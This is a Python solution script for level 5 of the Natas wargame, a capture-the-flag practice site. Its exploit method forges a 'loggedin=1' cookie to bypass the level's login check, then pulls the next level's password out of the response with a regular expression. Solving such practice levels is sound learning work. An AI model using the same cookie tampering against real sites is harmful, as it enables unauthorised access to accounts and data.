import re
from src.natas.base_level import NatasLevel

class Level_05(NatasLevel):

  num = 5
  explanation = "On this level, we are not logged in, with dev tools (F12)\n     on cookies section we can the cookie 'loggedin' with value 0 (False),\n     if we replace it with 1 (True) when que do the request, we get \n     the next level password."

  def exploit(self) -> str:

    resp  = self.session.get(self.base_url, cookies = {'loggedin': '1'})
    match = re.search(r"natas6 is (\S+)", resp.text)

    # In the response the password is followed by a "</div>", so replacing it with "" it desapears
    if "</div>" in match.group(1):
      return match.group(1).replace("</div>", "")
    else:
      return match.group(1)
